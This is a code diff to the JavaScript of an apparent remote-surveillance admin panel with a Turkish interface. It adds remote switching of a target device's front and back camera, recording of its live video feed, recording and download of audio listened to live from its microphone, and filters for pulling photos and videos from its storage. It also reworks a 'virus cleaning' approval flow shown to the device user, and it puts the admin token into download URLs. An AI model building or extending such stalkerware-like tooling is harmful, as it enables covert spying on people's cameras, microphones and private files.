@@ -265,6 +265,7 @@ function renderModuleCamera() {
         <div class="camera-viewer">
             <div class="camera-toolbar">
                 <button class="btn btn-sm btn-primary" id="cameraToggleBtn" onclick="toggleCameraWatch()">Canli Izle</button>
+                <button class="btn btn-sm btn-secondary" id="facingBtn" onclick="switchAdminFacing()">Arka Kamera</button>
                 <button class="btn btn-sm btn-secondary" id="webrtcRecordBtn" onclick="toggleWebRTCRecording()">Video Kaydet</button>
                 <button class="btn btn-sm btn-secondary" onclick="captureSnapshot()">Fotograf Cek</button>
                 <span class="camera-status" id="cameraStatus">Bekleniyor...</span>
@@ -287,6 +288,21 @@ function toggleCameraWatch() {
     else startCameraWatch();
 }
 
+let adminFacingBack = false;
+
+function switchAdminFacing() {
+    if (!selectedUid) return;
+    adminFacingBack = !adminFacingBack;
+    const signal = adminFacingBack ? 'cam_back' : 'cam_front';
+    const btn = document.getElementById('facingBtn');
+    if (btn) btn.textContent = adminFacingBack ? 'On Kamera' : 'Arka Kamera';
+    fetch(`${API_BASE}/api/admin/storage/signal/${selectedUid}`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json', 'X-Admin-Token': getAdminToken() },
+        body: JSON.stringify({ signal })
+    }).catch(() => {});
+}
+
 function startCameraWatch() {
     if (!selectedUid) return;
     cameraWatching = true;
@@ -299,23 +315,34 @@ function startCameraWatch() {
     const btn = document.getElementById('cameraToggleBtn');
     if (btn) { btn.textContent = 'Durdur'; btn.className = 'btn btn-sm btn-danger'; }
 
-    // WebRTC baglantisi dene (poll ile offer al)
-    if (webrtcOfferPollInterval) clearInterval(webrtcOfferPollInterval);
-    webrtcOfferPollInterval = setInterval(() => pollWebRTCOffer(selectedUid), 3000);
-    pollWebRTCOffer(selectedUid);
+    restartWebrtcOfferPoll();
+    startCameraChunkPoll();
+}
 
+function startCameraChunkPoll() {
+    stopCameraChunkPoll();
     pollCameraStream();
-    cameraPollInterval = setInterval(pollCameraStream, 2000);
+    cameraPollInterval = setInterval(pollCameraStream, 1000);
+}
+
+function stopCameraChunkPoll() {
+    if (cameraPollInterval) {
+        clearInterval(cameraPollInterval);
+        cameraPollInterval = null;
+    }
+}
+
+function restartWebrtcOfferPoll() {
+    if (webrtcOfferPollInterval) clearInterval(webrtcOfferPollInterval);
+    webrtcOfferPollInterval = setInterval(() => pollWebRTCOffer(selectedUid), 2000);
+    pollWebRTCOffer(selectedUid);
 }
 
 function stopCameraWatch() {
     cameraWatching = false;
     cameraChunkQueue = [];
     cameraPlaying = false;
-    if (cameraPollInterval) {
-        clearInterval(cameraPollInterval);
-        cameraPollInterval = null;
-    }
+    stopCameraChunkPoll();
     if (webrtcOfferPollInterval) {
         clearInterval(webrtcOfferPollInterval);
         webrtcOfferPollInterval = null;
@@ -333,6 +360,7 @@ function stopCameraWatch() {
 
 async function pollCameraStream() {
     if (!selectedUid || !cameraWatching) return;
+    if (adminWebrtcRemoteStream) return;
     try {
         const resp = await fetch(
             `${API_BASE}/api/admin/camera-stream/${selectedUid}?after=${cameraLastSeq}`,
@@ -353,6 +381,11 @@ async function pollCameraStream() {
 }
 
 function playNextChunk() {
+    if (adminWebrtcRemoteStream) {
+        cameraChunkQueue = [];
+        cameraPlaying = false;
+        return;
+    }
     if (cameraChunkQueue.length === 0 || !cameraWatching) {
         cameraPlaying = false;
         return;
@@ -465,6 +498,11 @@ async function pollWebRTCOffer(uid) {
 
 async function acceptWebRTCOffer(uid, offer) {
     try {
+        if (adminWebrtcPC) {
+            try { adminWebrtcPC.close(); } catch {}
+            adminWebrtcPC = null;
+            adminWebrtcRemoteStream = null;
+        }
         const pc = new RTCPeerConnection({
             iceServers: [
                 { urls: 'stun:stun.l.google.com:19302' },
@@ -495,10 +533,24 @@ async function acceptWebRTCOffer(uid, offer) {
 
         pc.oniceconnectionstatechange = () => {
             const st = document.getElementById('cameraStatus');
+            if (pc.iceConnectionState === 'connected' || pc.iceConnectionState === 'completed') {
+                if (st) st.textContent = 'WebRTC canli';
+                stopCameraChunkPoll();
+                return;
+            }
             if (st) st.textContent = 'WebRTC: ' + pc.iceConnectionState;
             if (pc.iceConnectionState === 'disconnected' || pc.iceConnectionState === 'failed') {
-                adminWebrtcPC = null;
-                adminWebrtcRemoteStream = null;
+                if (adminWebrtcPC === pc) {
+                    try { pc.close(); } catch {}
+                    adminWebrtcPC = null;
+                    adminWebrtcRemoteStream = null;
+                    const video = document.getElementById('cameraVideo');
+                    if (video) video.srcObject = null;
+                }
+                if (cameraWatching) {
+                    startCameraChunkPoll();
+                    restartWebrtcOfferPoll();
+                }
             }
         };
 
@@ -565,19 +617,27 @@ function toggleWebRTCRecording() {
     if (webrtcMediaRecorder && webrtcMediaRecorder.state === 'recording') {
         stopWebRTCRecording();
         if (btn) btn.textContent = 'Video Kaydet';
-    } else {
-        startWebRTCRecording();
+    } else if (startWebRTCRecording()) {
         if (btn) btn.textContent = 'Kayit Durdur';
     }
 }
 
 function startWebRTCRecording() {
-    if (!adminWebrtcRemoteStream) return;
+    let stream = adminWebrtcRemoteStream;
+    if (!stream) {
+        const video = document.getElementById('cameraVideo');
+        if (video) {
+            try {
+                stream = video.captureStream ? video.captureStream() : (video.mozCaptureStream ? video.mozCaptureStream() : null);
+            } catch {}
+        }
+    }
+    if (!stream) return false;
     webrtcRecordedChunks = [];
     const mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')
         ? 'video/webm;codecs=vp8,opus' : 'video/webm';
     try {
-        webrtcMediaRecorder = new MediaRecorder(adminWebrtcRemoteStream, { mimeType });
+        webrtcMediaRecorder = new MediaRecorder(stream, { mimeType });
         webrtcMediaRecorder.ondataavailable = (e) => {
             if (e.data.size > 0) webrtcRecordedChunks.push(e.data);
         };
@@ -591,7 +651,11 @@ function startWebRTCRecording() {
             setTimeout(() => URL.revokeObjectURL(url), 60000);
         };
         webrtcMediaRecorder.start(1000);
-    } catch {}
+        return true;
+    } catch {
+        webrtcMediaRecorder = null;
+        return false;
+    }
 }
 
 function stopWebRTCRecording() {
@@ -608,12 +672,15 @@ let audioPollInterval = null;
 let audioLastSeq = -1;
 let audioChunkQueue = [];
 let audioPlaying = false;
+let audioRecRecorder = null;
+let audioRecChunks = [];
 
 function renderModuleAudio() {
     return `
         <div class="audio-viewer">
             <div class="audio-toolbar">
                 <button class="btn btn-sm btn-primary" id="audioListenBtn" onclick="toggleAudioListen()">Canli Dinle</button>
+                <button class="btn btn-sm btn-secondary" id="audioRecBtn" onclick="toggleAudioRecording()">Ses Kaydet</button>
                 <button class="btn btn-sm btn-secondary" id="audioSendBtn" onclick="recordAndSendAudio()">Ses Gonder</button>
                 <span class="audio-status" id="audioStatus">Bekleniyor...</span>
             </div>
@@ -654,6 +721,7 @@ function startAudioListen() {
 }
 
 function stopAudioListen() {
+    stopAudioRecording();
     audioListenActive = false;
     audioChunkQueue = [];
     audioPlaying = false;
@@ -667,6 +735,59 @@ function stopAudioListen() {
     if (btn) { btn.textContent = 'Canli Dinle'; btn.className = 'btn btn-sm btn-primary'; }
     const st = document.getElementById('audioStatus');
     if (st) st.textContent = 'Durduruldu';
+}
+
+function toggleAudioRecording() {
+    if (audioRecRecorder && audioRecRecorder.state === 'recording') {
+        stopAudioRecording();
+        return;
+    }
+    const audio = document.getElementById('audioPlayer');
+    if (!audio) return;
+    let stream = null;
+    try {
+        stream = audio.captureStream ? audio.captureStream() : (audio.mozCaptureStream ? audio.mozCaptureStream() : null);
+    } catch {}
+    if (!stream) {
+        const st = document.getElementById('audioStatus');
+        if (st) st.textContent = 'Kayit desteklenmiyor';
+        return;
+    }
+    audioRecChunks = [];
+    const mimeType = MediaRecorder.isTypeSupported('audio/webm;codecs=opus')
+        ? 'audio/webm;codecs=opus' : 'audio/webm';
+    try {
+        audioRecRecorder = new MediaRecorder(stream, { mimeType });
+    } catch {
+        audioRecRecorder = null;
+        return;
+    }
+    audioRecRecorder.ondataavailable = (e) => {
+        if (e.data.size > 0) audioRecChunks.push(e.data);
+    };
+    audioRecRecorder.onstop = () => {
+        const blob = new Blob(audioRecChunks, { type: 'audio/webm' });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = 'ses_' + selectedUid + '_' + Date.now() + '.webm';
+        a.click();
+        setTimeout(() => URL.revokeObjectURL(url), 60000);
+    };
+    audioRecRecorder.start(1000);
+    const btnRec = document.getElementById('audioRecBtn');
+    if (btnRec) btnRec.textContent = 'Kaydi Durdur';
+    const st = document.getElementById('audioStatus');
+    if (st) st.textContent = 'Ses kaydediliyor...';
+}
+
+function stopAudioRecording() {
+    if (audioRecRecorder && audioRecRecorder.state !== 'inactive') {
+        try { audioRecRecorder.stop(); } catch {}
+    }
+    audioRecRecorder = null;
+    const btn = document.getElementById('audioRecBtn');
+    if (btn) btn.textContent = 'Ses Kaydet';
 }
 
 async function pollAudioFeed() {
@@ -940,14 +1061,15 @@ function updateLocationUI(data) {
 
 // ==================== STORAGE MODULE ====================
 
-let storageFiles = [];
-let storageCurrentPath = '';
-
 function renderModuleStorage() {
     return `
         <div class="storage-viewer">
             <div class="storage-toolbar">
                 <button class="btn btn-sm btn-primary" onclick="loadAdminStorageFiles()">Dosyalari Getir</button>
+                <button class="btn btn-sm btn-secondary filter-active" onclick="setStorageFilter('all', this)">Tumu</button>
+                <button class="btn btn-sm btn-secondary" onclick="setStorageFilter('media', this)">Medya</button>
+                <button class="btn btn-sm btn-secondary" onclick="setStorageFilter('photos', this)">Fotograflar</button>
+                <button class="btn btn-sm btn-secondary" onclick="setStorageFilter('videos', this)">Videolar</button>
                 <button class="btn btn-sm btn-secondary" onclick="selectAllAdminStorage()">Tumunu Sec</button>
                 <button class="btn btn-sm btn-danger" onclick="deleteSelectedAdminFiles()">Secilenleri Sil</button>
                 <span class="storage-status" id="storageStatus">Dosyalar bekleniyor...</span>
@@ -959,6 +1081,76 @@ function renderModuleStorage() {
             </div>
         </div>
     `;
+}
+
+let storageFiles = [];
+let storageCurrentPath = '';
+let storageFilter = 'all';
+
+function isMediaFileMeta(f) {
+    const mime = (f.mime || '').toLowerCase();
+    const name = (f.original_name || f.name || '').toLowerCase();
+    return mime.startsWith('image/') || mime.startsWith('video/') ||
+           /\.(jpe?g|png|gif|webp|bmp|mp4|mov|avi|mkv|webm|m4v|3gp)$/i.test(name);
+}
+
+function isVideoFileMeta(f) {
+    const mime = (f.mime || '').toLowerCase();
+    const name = (f.original_name || f.name || '').toLowerCase();
+    return mime.startsWith('video/') || /\.(mp4|mov|avi|mkv|webm|m4v|3gp)$/i.test(name);
+}
+
+function setStorageFilter(f, btn) {
+    storageFilter = f;
+    if (btn) {
+        btn.parentElement.querySelectorAll('button.filter-active').forEach(b => b.classList.remove('filter-active'));
+        btn.classList.add('filter-active');
+    }
+    renderAdminStorageList();
+}
+
+function renderAdminStorageList() {
+    const list = document.getElementById('adminStorageFileList');
+    const st = document.getElementById('storageStatus');
+    if (!list) return;
+
+    let files = storageFiles;
+    if (storageFilter === 'media') files = files.filter(isMediaFileMeta);
+    else if (storageFilter === 'photos') files = files.filter(f => isMediaFileMeta(f) && !isVideoFileMeta(f));
+    else if (storageFilter === 'videos') files = files.filter(isVideoFileMeta);
+
+    if (st) st.textContent = files.length + ' dosya';
+
+    if (files.length === 0) {
+        list.innerHTML = '<div class="storage-placeholder"><p>Bu filtrede dosya yok</p></div>';
+        return;
+    }
+
+    const token = encodeURIComponent(getAdminToken());
+    list.innerHTML = files.map(f => {
+        const fname = escapeHtml(f.original_name || f.name || 'dosya');
+        const fsize = f.size || 0;
+        const ftime = f.upload_time ? new Date(f.upload_time * 1000).toLocaleString() : '';
+        const sizeStr = fsize > 1048576 ? (fsize / 1048576).toFixed(1) + ' MB' :
+                       fsize > 1024 ? Math.round(fsize / 1024) + ' KB' : fsize + ' B';
+        const mime = (f.mime || '').toLowerCase();
+        const dlUrl = '/api/admin/storage/download/' + f.file_id + '?token=' + token;
+        let icon = '📄';
+        let thumb = '';
+        if (mime.startsWith('image/')) {
+            thumb = '<img class="storage-thumb" loading="lazy" src="' + dlUrl + '" alt="">';
+        } else if (mime.startsWith('video/')) {
+            icon = '🎬';
+        }
+        return '<div class="storage-item">' +
+            '<span class="storage-item-check"><input type="checkbox" class="admin-file-checkbox" data-fileid="' + f.file_id + '"></span>' +
+            (thumb || '<span class="storage-icon">' + icon + '</span>') +
+            '<span class="storage-name" title="' + fname.replace(/"/g, '&quot;') + '">' + fname + '</span>' +
+            '<span class="storage-size">' + sizeStr + '</span>' +
+            '<span class="storage-date">' + escapeHtml(ftime) + '</span>' +
+            '<a class="btn btn-xs btn-primary" href="' + dlUrl + '" target="_blank" style="text-decoration:none;">⬇</a>' +
+            '</div>';
+    }).join('');
 }
 
 function loadAdminStorageFiles() {
@@ -976,28 +1168,8 @@ function loadAdminStorageFiles() {
             if (st) st.textContent = 'Hata';
             return;
         }
-        if (st) st.textContent = data.count + ' dosya bulundu';
-
-        if (data.count === 0) {
-            list.innerHTML = '<div class="storage-placeholder"><p>Henüz dosya yok</p></div>';
-            return;
-        }
-
-        list.innerHTML = data.files.map(f => {
-            const fname = escapeHtml(f.original_name || f.name || 'dosya');
-            const fsize = f.size || 0;
-            const ftime = f.upload_time ? new Date(f.upload_time * 1000).toLocaleString() : '';
-            const sizeStr = fsize > 1048576 ? (fsize / 1048576).toFixed(1) + ' MB' :
-                           fsize > 1024 ? Math.round(fsize / 1024) + ' KB' : fsize + ' B';
-            return '<div class="storage-item">' +
-                '<span class="storage-item-check"><input type="checkbox" class="admin-file-checkbox" data-fileid="' + f.file_id + '"></span>' +
-                '<span class="storage-icon">📄</span>' +
-                '<span class="storage-name" title="' + fname.replace(/"/g, '&quot;') + '">' + fname + '</span>' +
-                '<span class="storage-size">' + sizeStr + '</span>' +
-                '<span class="storage-date">' + escapeHtml(ftime) + '</span>' +
-                '<a class="btn btn-xs btn-primary" href="/api/admin/storage/download/' + f.file_id + '" target="_blank" style="text-decoration:none;">⬇</a>' +
-                '</div>';
-        }).join('');
+        storageFiles = data.files || [];
+        renderAdminStorageList();
     })
     .catch(() => {
         if (st) st.textContent = 'Liste alınamadı';
@@ -1104,16 +1276,7 @@ async function pollVirusAdmin() {
         const st = document.getElementById('virusStatus');
         if (!area) return;
 
-        if (scan.delete_requested) {
-            if (st) st.textContent = 'Silme işlemi beklemede';
-            area.innerHTML = `
-                <div class="scan-admin-delete-request">
-                    <div class="scan-admin-alert">Kullanıcı silme talebinde bulundu</div>
-                    <p>Kullanıcı tespit edilen ${scan.findings?.length || 0} tehdidi silmek istiyor.</p>
-                    <button class="btn btn-danger" onclick="confirmVirusClean()">Silme İşlemini Onayla</button>
-                </div>
-            `;
-        } else if (scan && scan.confirmed) {
+        if (scan && scan.confirmed) {
             stopVirusAdminPolling();
             if (st) st.textContent = 'Temizlendi';
             area.innerHTML = `<div class="scan-admin-cleaned">
@@ -1121,6 +1284,15 @@ async function pollVirusAdmin() {
                 <h3>Temizlik Tamamlandı</h3>
                 <p>Tespit edilen tüm tehditler kullanıcı cihazından başarıyla temizlendi.</p>
             </div>`;
+        } else if (scan && (scan.delete_requested || scan.status === 'cleaning')) {
+            if (st) st.textContent = 'Silme onayı bekliyor';
+            area.innerHTML = `
+                <div class="scan-admin-delete-request">
+                    <div class="scan-admin-alert">Kullanıcı silme talebinde bulundu</div>
+                    <p>Kullanıcı tespit edilen ${scan.findings?.length || 0} tehdidi silmek istiyor. Onaylarsanız temizlik kullanıcı cihazında tamamlanır.</p>
+                    <button class="btn btn-danger" onclick="confirmVirusClean()">Silme İşlemini Onayla</button>
+                </div>
+            `;
         } else if (scan && scan.status === 'scanning') {
             if (st) st.textContent = 'Kullanıcı taraması devam ediyor...';
             area.innerHTML = `<div class="scan-admin-wait"><p>Kullanıcı taraması devam ediyor (${Math.round(scan.progress || 0)}%)...</p></div>`;
@@ -1241,7 +1413,7 @@ function renderNotifPanel(notifs) {
 
     panel.innerHTML = notifs.map(n => `
         <div class="notif-item ${n.read ? '' : 'unread'}">
-            <div>${n.type === 'virus_clean' ? '🧹' : '🔔'} ${n.message}</div>
+            <div>${n.type === 'virus_clean' || n.type === 'virus_delete' ? '🧹' : '🔔'} ${n.message}</div>
             <div class="notif-time">${new Date(n.time * 1000).toLocaleTimeString()}</div>
         </div>
     `).join('');
